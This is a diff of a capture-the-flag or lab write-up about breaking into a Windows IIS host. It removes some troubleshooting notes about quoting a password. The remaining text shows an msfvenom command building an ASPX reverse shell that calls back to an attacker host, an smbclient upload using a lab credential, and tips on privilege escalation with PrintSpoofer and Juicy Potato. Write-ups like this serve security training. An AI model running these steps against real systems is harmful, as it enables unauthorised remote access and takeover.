@@ -125,17 +125,12 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI_IP> LPORT=4444 -f aspx -o 
 > **Failure — PHP shell:** Initially generated a PHP reverse shell (`-f php`). Uploading and triggering it returned nothing.
 > **Root cause:** IIS cannot execute PHP by default. IIS serves `.aspx` (ASP.NET) files natively. Switched to `-f aspx` and the shell worked.
 
-> **Failure — msfvenom backslash error:** During initial generation, a backslash in the `-o` path caused a formatting error. Used a simple filename without path separators to avoid the issue.
-
 Uploaded the shell to the SMB share:
 
 ```bash
 smbclient //<TARGET_IP>/nt4wrksv -U 'Bob%!P@$W0rD!123'
 put shell.aspx
 ```
-
-> **Failure — password with `$` symbol:** The first attempt used double-quotes around the password: `-U "Bob%!P@$W0rD!123"`. The shell interpreted `$W0rD` as a variable and the password was mangled, resulting in `NT_STATUS_LOGON_FAILURE`.
-> **Fix:** Wrapping the password in single quotes (`'Bob%!P@$W0rD!123'`) prevents variable expansion.
 
 Started a listener and triggered the shell:
 
@@ -224,8 +219,6 @@ Path: `C:\Windows\System32\config\root.txt`
 - 🔗 **Map SMB shares to web directories:** When a non-standard IIS port exists alongside a named SMB share, test whether the share name appears as a virtual path on the web server. File upload via SMB can become RCE via HTTP.
 
 - 🪟 **IIS executes ASPX, not PHP:** PHP shells silently fail on IIS. Recognize the web server stack before generating a shell — IIS requires `.aspx`, Apache/Nginx needs `.php`.
-
-- 💲 **Special characters in CLI credentials need single quotes:** Passwords containing `$`, `!`, or `&` will be interpreted by the shell if double-quoted or unquoted. Single-quote the entire credential string to pass it literally.
 
 - 🎭 **SeImpersonatePrivilege means impersonation attacks are viable:** Any service account running IIS or MSSQL typically has this privilege. PrintSpoofer and Juicy Potato reliably escalate to SYSTEM from this position on modern Windows targets.
 
